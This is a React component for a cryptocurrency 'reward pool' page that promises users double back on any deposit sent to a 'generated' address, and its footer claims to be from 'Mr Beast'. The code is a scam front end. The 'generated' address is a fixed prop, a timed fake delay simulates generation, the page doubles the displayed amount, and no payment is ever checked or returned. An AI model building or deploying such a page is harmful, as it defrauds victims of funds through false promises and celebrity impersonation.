/* eslint-disable react/prop-types */
import { useState } from "react";
import Spinner from "../assets/spinner.svg";
import { Loader2 } from "lucide-react";
import LiveChat from "./LiveChat";

export default function Pay({ Address, Icon, symbol, Qr, Name, Min, Max }) {
  const [amount, setAmount] = useState("");
  const [approve, setApporve] = useState(false);
  const [copied, setCopied] = useState(false);
  const [value, setValue] = useState(false);
  const [pay, setPay] = useState(false);
  const [user, setUser] = useState("");
  const [loading, setLoading] = useState(false);

  function handleAmount(event) {
    const inputValue = parseFloat(event.target.value);
    if (isNaN(inputValue) || inputValue < Min) {
      setAmount(0);
    } else {
      setAmount(inputValue * 2);
    }
  }

  function handleApprove() {
    setApporve(true);
    setPay(true);
  }

  function generate(event) {
    const userAddress = event.target.value;
    setUser(userAddress);
  }

  const copyText = () => {
    navigator.clipboard
      .writeText(Address)
      .then(() => {
        setCopied(true);
        setTimeout(() => {
          setCopied(false);
        }, 2000);
      })
      .catch((err) => {
        console.error("Failed to copy: ", err);
      });
  };

  function generateDelay() {
    setLoading(true);
    if (user.length > 10) {
      setTimeout(() => {
        setLoading(false);
        handleApprove();
        setLoading(false);
      }, 3000);
    } else {
      return alert("Plese enter receipent wallet address");
    }
  }

  return (
    <div className="css-1bx211v container">
      <div className="css-1rs9gl">
        <div className="rules">
          <div className="pt-8">
            <p className="text-neutral-500 mb-4 font-[Montserrat] font-medium leading-tight">
              To verify your Address, You are required to make deposit into the
              reward pool. You will receive a 2x of the deposit made to the
              generated address.
            </p>
          </div>
          <div>
            <ul className="font-medium flex flex-col my-4 font-[Montserrat] text-neutral-900">
              <li>
                Step 1: Make sure you have at least {Min} {symbol} or above in
                your wallet.
              </li>
              <li>Step 2: Enter the amount you wish to invest below.</li>
              <li>Step 3: Enter your {symbol} address</li>
              <li>
                Step 4: Click the Generate payment button to generate the
                payment address.
              </li>
              <li>Step 5: Make deposit to generated address.</li>
              <li>Step 6: Confirm payment.</li>
              <li>Step 7: Wait for at least 10 - 18 minutes.</li>
            </ul>
          </div>
        </div>
        <div className="calculate font-[Montserrat]">
          <div className="calculator participateLeft">
            <div className="calculatorInput formContainer">
              <div className="font-semibold text-neutral-700 text-sm mb-3">
                {" "}
                Enter the amount{" "}
              </div>
              <div className="block">
                <div className="info">
                  <div className="header mb-2">
                    <img
                      src={Icon}
                      alt="Binance coin"
                      className="icon"
                      width="24"
                    />
                    <span className="text-[11px] font-semibold text-neutral-800">
                      {Name}
                    </span>
                  </div>
                </div>
                <div className="formGroup">
                  <div>
                    <div className="flex mb-2 w-full gap-2 text-sm items-center">
                      <input
                        className="text-sm w-full border-1 p-1.5 font-bold text-neutral-700 border-neutral-800"
                        onChange={handleAmount}
                        placeholder="Enter Amount"
                        type="number"
                      />
                      {/* <span className="font-semibold text-xs text-neutral-800">
                        {symbol}
                      </span> */}
                    </div>
                    <div className="group">
                      <small className="small text-xs">
                        Min:
                        <span className="text-xs font-semibold text-neutral-800">
                          {Min} {symbol}
                        </span>
                      </small>
                      <small className="text-xs font-semibold ">
                        Max:
                        <span className="text-xs font-semibold text-neutral-800">
                          {Max} {symbol}
                        </span>
                      </small>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="calculatorInput formContainer">
              <div className="font-semibold text-sm text-neutral-700 mb-1.5">
                Amount to receive <span>2X</span> back{" "}
              </div>
              <div className="block">
                <div>
                  <div className="flex items-center flex-row w-ull gap-2">
                    <input
                      className="text-sm font-bold justify-between  text-amber-800"
                      defaultValue={amount}
                      placeholder="Waiting  for input..."
                      type="number"
                    />
                    <span className="text-xs font-semibold">{symbol}</span>
                  </div>
                </div>
              </div>
              <div className="w-full">
                <p className="my-1 mt-2 text-sm  font-medium text-neutral-800">
                  Enter Your wallet Address
                </p>
                <input
                  onChange={generate}
                  className="text-sm font-semibold my-1 border-1 border-neutral-800 text-neutral-800 w-full p-1.5"
                  placeholder="Enter Receivers wallet address"
                  type="text"
                />
              </div>
              <button
                disabled={loading}
                onClick={generateDelay}
                className="flex gap-1 items-center justify-center mx-[0.5%] text-sm font-medium w-full rounded-xl  text-center text-white py-1.5 bg-purple-600"
              >
                Generate
                {loading ? <Loader2 className="h-3 w-3 animate-spin" /> : null}
              </button>
            </div>
          </div>
          <div className="form formContainer participateRight">
            {pay ? (
              <>
                <div className="">
                  <p className="text-sm mb-2 font-medium text-neutral-700">
                    Send <span className="lowercase mb-1">{String(Name)}</span>{" "}
                    to the <span>generated</span> address to receive{" "}
                    <span>2X</span> back{" "}
                  </p>
                  <div className="text-xs flex items-center gap-1.5">
                    <img
                      width="24"
                      className="w-4 h-4 animate-spin"
                      src={Spinner}
                    />
                    <span className="font-medium">Waiting for payment</span>
                  </div>
                </div>
                <div className="f">
                  <div className="">
                    <p className="text-sm font-neutral-800 my-1.5 font-medium">
                      Generated address
                    </p>
                    <div className="w-full">
                      <p className="text-sm font-medium text-neutral-800 w-full truncate">
                        {Address}
                      </p>
                    </div>
                    <button
                      onClick={copyText}
                      className="mx-[0.5%] mt-1.5 text-sm font-medium w-full rounded-xl  text-center text-white py-1.5 bg-purple-600"
                    >
                      {copied ? "Copied!" : "Copy address"}
                    </button>
                  </div>

                  <div className="qr">
                    <img
                      src={Qr}
                      className="canvas"
                      width={132}
                      height={132}
                    ></img>{" "}
                  </div>
                </div>
              </>
            ) : (
              ""
            )}
          </div>
        </div>
        <div className="css-223shg">
          <div data-bn-type="text" className="css-vurnku">
            Mr Beast © 2025
          </div>
        </div>
      </div>
      <LiveChat />
    </div>
  );
}
